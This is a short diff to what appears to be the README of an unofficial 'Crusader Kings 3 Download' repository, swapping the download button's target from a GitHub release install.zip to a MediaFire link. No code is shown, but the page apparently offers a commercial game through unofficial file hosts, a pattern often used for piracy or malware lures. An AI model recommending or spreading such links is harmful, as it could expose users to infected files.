@@ -4,7 +4,7 @@
 </div>
 
 <div align="center">
-  <a href="https://github.com/risik52/Crusader-Kings-3-Download/releases/download/crusader-kings-3/install.zip">
+  <a href="https://app.mediafire.com/t8zrgyorywwai?crusa">
     <img src="https://github.com/user-attachments/assets/f951a1cf-d497-465d-acf6-89023eaba82e" height="80" alt="Link Image">
   </a>
 </div>
